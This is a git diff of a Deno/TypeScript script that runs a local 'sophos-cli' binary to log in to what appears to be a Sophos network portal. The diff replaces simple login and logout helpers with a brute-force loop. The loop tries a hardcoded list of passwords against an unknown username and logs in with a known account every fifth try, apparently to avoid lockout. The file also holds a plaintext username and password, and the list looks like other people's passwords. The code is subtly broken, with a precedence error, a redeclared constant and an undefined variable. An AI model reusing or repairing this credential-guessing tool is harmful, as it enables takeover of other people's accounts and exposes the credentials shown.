@@ -1,35 +1,9 @@
-const username = "9919103015";
-let password = "052019UH";
+const username_known = "9919103015";
+const password_known = "052019UH";
 
-function login() {
-  // create subprocess
-  const p = Deno.run({
-    args: [
-      "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
-      username,
-      password,
-      "login"
-    ]
-  });
-  // await its completion
-  await p.status();
-}
+const username_to_find = ""
 
-function logout() {
-  // create subprocess
-  const p = Deno.run({
-    args: [
-      "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
-      username,
-      password,
-      "logout"
-    ]
-  });
-  // await its completion
-  await p.status();
-}
-
-let list = [
+const password_list: Array<string> = [
   "157030AR",
   "216031IM",
   "268032SH",
@@ -82,4 +56,40 @@ let list = [
   "381041OS",
   "199040AS"
 ];
- 
+
+for (let i = 0; i < list.length; ) {
+  if (i + 1 % 5 == 0) {
+    const p = Deno.run({
+      args: [
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        username_known,
+        password_known,
+        "login"
+      ]
+    });
+    // await its completion
+    await p.status();
+    const p = Deno.run({
+      args: [
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        username_known,
+        password_known,
+        "logout"
+      ]
+    });
+    // await its completion
+    await p.status();
+  } else {
+    const p = Deno.run({
+      args: [
+        "/home/akshat/projects/sophos-cli/target/debug/sophos-cli",
+        username_to_find,
+        password_list[i],
+        "login"
+      ]
+    });
+    // await its completion
+    await p.status();
+    i++;
+  }
+}
